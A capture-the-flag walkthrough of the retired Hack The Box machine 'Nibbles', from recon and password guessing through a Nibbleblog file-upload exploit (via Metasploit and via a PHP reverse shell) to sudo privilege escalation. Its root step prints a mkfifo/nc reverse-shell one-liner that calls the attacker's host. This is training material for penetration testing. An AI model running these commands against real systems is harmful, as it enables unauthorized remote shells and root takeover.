---
title: Keep Calm and Hack The Box – Nibbles
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2021-05-25T00:20:22.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-nibbles
coverImage: https://www.freecodecamp.org/news/content/images/2021/05/synthwave-cityscape-4k-6x-1920x1080-1.jpeg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: information security
  slug: information-security
- name: '#infosec'
  slug: infosec
- name: Web Security
  slug: web-security
seo_title: null
seo_desc: 'Hack The Box (HTB) is an online platform that allows you to test your penetration
  testing skills.

  It contains several challenges that are constantly updated. Some of them simulate
  real world scenarios and some of them lean more towards a CTF style of...'
---

Hack The Box (HTB) is an online platform that allows you to test your penetration testing skills.

It contains several challenges that are constantly updated. Some of them simulate real world scenarios and some of them lean more towards a CTF style of challenge.

**Note**: _Only write-ups of retired HTB machines are allowed._

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.44.51.png)

  
Nibbles is an easy machine which focuses on guessing passwords and enumerating web applications.

In this tutorial, we will use the following tools to pawn the box:

* nmap
* gobuster
* metasploit
* PHP reverse shell
* netcat

Let's get started!

## **Step 1** – Do Some **Reconnaissance**

The first step before exploiting a machine is to do a little bit of scanning and reconnaissance.

This is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on this phase to get as much information as you can.

### **Port scanning** with Nmap

I will use **Nmap** (Network Mapper). Nmap is a free and open source utility for network discovery and security auditing.

It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.

There are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation [here](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-22.59.16.png)

I use the following command to perform an intensive scan:

```bash
nmap -A -v 10.129.151.27
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-22.57.48.png)

**-A:** Enables OS detection, version detection, script scanning, and traceroute

**-v:** Increases verbosity level

**10.129.151.27**:**** IP for the Nibbles box

If you find the results a little bit too overwhelming, you can try this:

```bash
nmap 10.129.151.27
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-22.56.30.png)

We can see that there are 2 open ports:

**Port** 22. Secure Shell (SSH), secure logins, file transfers (scp, sftp) and port forwarding

**Port** 80. Hypertext Transfer Protocol (HTTP). Here it's an Apache server (httpd 2.4.18).

## **Step 2** – **Visit the** W**eb** P**age**

From the reconnaissance phase, I decide to start with port 80. And I get a page with a simple "Hello World" message at the top.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.00.57.png)

I look at the source code and see that there is a commented line:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.02.03.png)

I navigate to this folder and land on what looks like a blog page called "Nibbles Yum Yum".

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.04.59.png)

I can see at the bottom that the blog is powered by Nibbleblog. I have a look at what it is. 

Nibbleblog is described as an easy, fast and free PHP blog system. You can find more info [here](https://www.nibbleblog.com/).

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.04.38.png)

Having this new piece of information, I decide to run **Gobuster**. Gobuster is a directory scanner written in Go. You can find more info on the tool [here](https://tools.kali.org/web-applications/gobuster).

Gobuster uses wordlists on the HTB Parrot box which are located in the **/usr/share/**wfuzz/wordlist/ directory. I'm using the "**common.txt**" wordlist, but you can download more wordlists from **SecLists** [here](https://github.com/danielmiessler/SecLists).

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.06.56.png)

I use this command for the dirb common.txt wordlist:

```bash
gobuster dir -u 10.129.151.27 -w /usr/share/wfuzz/wordlist/general/common.txt -x php,txt
```

I also focus on .php and .txt files with the **-x** flag (extensions).

There are a couple of great findings, including an **/**admin**/** folder. I start by checking the **/content/** folder.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.11.24.png)

Then the **/install.php** file. I click on update:

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.10.15.png)

I land on the **/update.php** page I found on Gobuster. There is a couple of links:

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.09.54.png)

I navigate to the first one, the **/config.xml** page:

```bash
10.129.151.27/nibbleblog/content/private/config.xml
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.19.02.png)

I scan through the xml file and write down the email I find there:

```bash
admin@nibbles.com
```

which could potentially be valuable user information.

I continue scanning through the other pages I found with Gobuster. I navigate to the **/admin/** folder:

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.12.23.png)

And to the **/admin.php** page. I finally find a login page!

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.11.55.png)

I try dummy credentials to see the behaviour of the page. The parameters for the form are:

```bash
username=test&password=test
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.22.21.png)

I navigate to the last page I found on Gobuster, the **/users.xml** page. I can see that there is a username, **admin**, but also that there seems to be a blacklist mechanism in place. I assume so with the <blacklist> tags and my HTB IP address was added to the end. The fail count of **1** was my previous test with the dummy credentials.

It seems that we won't be able to brute force the login page. We will need to guess the username:password combination.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.22.44.png)

## **Step 3**a – Exploit the Nibbleblog V**ulnerability **with Metasploit****

From the reconnaissance phase on the **/update.php**, there was some information on the version of Nibbleblog.

```bash
Nibbleblog 4.0.3 "Coffee"
```

I google the version to check if there is any known vulnerability on this specific version. I find one on the **Exploit Database**. 

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.25.55.png)
_[https://www.exploit-db.com/exploits/](https://www.exploit-db.com/exploits/34900)38489_

There seems to be a Metasploit exploit available for this vulnerability. 

I then use **Metasploit**, which is a penetration testing framework that makes hacking simple. It's an essential tool for many attackers and defenders.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.14.13.png)

I launch the **Metasploit Framework** and look for the command I should use for the exploit.

Don't forget to update Metasploit when you launch it with this command:

```bash
msfupdate
```

I search for the exploit with this command:

```bash
search nibbleblog
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.27.59.png)

This is the same one I found on the Exploit Database. I get more information with:

```bash
info 0
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.29.19.png)

This also gives me an idea of the options required for the exploit. We can see all the required ones – including a valid username:password combination:

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.29.47.png)

The information section gives us a couple of links to learn more about the vulnerability. The first link redirects to the **National Vulnerability Database**.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.30.40.png)
_https://nvd.nist.gov/vuln/detail/CVE-2015-6967_

The second link is a security research blog on manually exploiting the vulnerability. I will use this method in the next step.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.31.41.png)
_https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html_

Now that we have a little bit more context, let's use the exploit with:

```bash
use 0
```

You should now see the msf6 terminal set to:

```bash
exploit(multi/http/nibbleblog_file_upload)
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.34.13.png)

I will now set the different options with these commands:

```bash
set USERNAME admin
```

```bash
set PASSWORD nibbles
```

I am setting the username:password combination to admin:nibbles. I found the username admin on the **/users.xml** page and I tried my luck for the password with the email I found on the **/config.xml** page (admin@nibbles.com)

```bash
set RHOSTS 10.129.151.27
```

```bash
set LHOST 10.10.14.110
```

I set the target URI to the blog page:

```bash
set TARGETURI /nibbleblog/
```

I run the **check** command – as I saw it was available when I checked the info on the exploit. The target appears to be vulnerable. This is also the confirmation that the options have been set correctly. 

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.44.34.png)

I check the options before running the exploit:

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.45.02.png)

I run the exploit with:

```bash
run
```

and get a **Meterpreter** session back.

Here's the definition of Meterpreter from [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/):

> Meterpreter is an advanced, dynamically extensible payload that uses _in-memory_ DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.

You can read more about Meterpreter [here](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.46.11.png)

## **Step** 3b – Exploit the Nibbleblog V**ulnerability **with****out **Metasploit**

Back to the **/admin.php** page. I have to guess the password. Looking at my notes, I found the username admin on the **/users.xml** page and I tried my luck for the password with the email I found on the **/config.xml** page (admin@nibbles.com).

I set the username:password combination to admin:nibbles.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.14.19.png)

And it works!

I can see the Nibbleblog Dashboard. We see on the notifications board on the right side that my **login failed attempt** was captured. 

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.14.40.png)

I navigate to the **Plugins** tab and to **My image**:

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.15.43.png)

We can upload a **PHP reverse shell** as an image file:

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.15.59.png)

**Pentestmonkey** has a list of reverse shells, and I will use the PHP one. The code is available on their GitHub repository.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.26.33.png)

Click on the **php-reverse-shell.php** file:

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.26.50.png)

This is the piece of code we will need to upload on the Nibbleblog Dashboard:

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.27.11.png)

I need to change this section with my HTB IP.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.28.31.png)

Back to my terminal, I create a new file called **image.php** with:

```bash
nano image.php
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.29.02.png)

I modify the file for the variable **$IP** with my HTB IP:

```bash
$IP = '10.10.14.110';
```

I leave the port to **1234**:

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.29.36.png)

Back to the Nibbleblog Dashboard. I upload the newly created **image.php** file with the reverse shell code. Ignore the warnings.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.24.08.png)

I set up a **Ncat** listener on port **1234** to catch the reverse shell connection.

> Ncat is a feature-packed networking utility which reads and writes data across networks from the command line. Ncat was written for the Nmap Project as a much-improved reimplementation of the venerable [Netcat](http://sectools.org/tool/netcat/). It uses both TCP and UDP for communication and is designed to be a reliable back-end tool to instantly provide network connectivity to other applications and users.

You can learn more about Ncat [here](https://nmap.org/book/ncat-man.html).

```bash
nc -nlvp 1234
```

And I navigate to the page to trigger the exploit:

```bash
10.129.151.27/nibbleblog/content/private/plugins/my_images/image.php
```

I then get a session back!

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.25.29.png)

## **Step 4 - Look for the user.txt Flag**

I check where I am located on the machine:

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.48.31.png)

And start navigating up to the **home** folder.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.49.39.png)

And I find the user flag! I can check the contents of the file with:

```bash
cat user.txt
```

## **Step 5 -** Look **for the root.txt** F**lag**

I navigate back to the **/** folder. I can't access the **root** folder.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.50.25.png)

I type the following command to get a standard shell on the target system:

```bash
shell
```

I spawn a TTY shell with:

```bash
python3 -c "import pty; pty.spawn('/bin/bash/');"
```

I have to use python3:

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.52.44.png)

I need to change to the root user to access this folder. I use the command:

```bash
sudo -l
```

to understand which command I can run on localhost.

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.53.29.png)

I find that the user **Nibbler** can execute the **/home/nibbler/personal/stuff/monitor.sh** command as “root” without a password.

Let's find this file! I navigate back to **/home/nibbler/** and find a zip file called **personal.zip**. I unzip the content with this command:

```bash
unzip personal.zip
```

I can see the **/personal/stuff/monitor.sh** file we are looking for:

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.55.37.png)

I check the content of the file with:

```bash
cat monitor.sh
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-23-at-23.56.32.png)

I decide to append the reverse shell to the end of this file with:

```bash
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14,110 1234 > /tmp/f" >> monitor.sh
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.10.19.png)

I cat the file to check if it has been added correctly to the end of the file:

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.10.41.png)

I set up a **Ncat** listener on port **1234** to catch the reverse shell connection on my terminal:

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.11.08.png)

And I then run the command on Nibbler's terminal with:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.09.51.png)

I am now root! I can navigate to the **root** folder. I find the root.txt file and check its content with:

```bash
cat root.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2021/05/Screenshot-2021-05-24-at-00.12.55.png)

Congrats! You found both flags.

## **Remediations**

* Use complex passwords and don't use default/generic passwords – admin:nibbles is too simple
* Patch to latest – in that case patch to the latest Nibbeblog version available 
* Apply the p[rinciple of least privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege) to all your systems and services

Please don’t hesitate ask questions or share with your friends :)

You can see more articles from the series **Keep Calm and Hack the Box** [here](https://www.freecodecamp.org/news/search/?query=keep%20calm%20and%20hack%20the%20box).

You can follow me on [Twitter](https://twitter.com/SonyaMoisset) or on [LinkedIn](https://www.linkedin.com/in/sonyamoisset/).

And don't forget to #**GetSecure**, #**BeSecure** & #**StaySecure**!

![Image](https://www.freecodecamp.org/news/content/images/2021/05/synthwave-cityscape-4k-6x-1920x1080.jpeg)

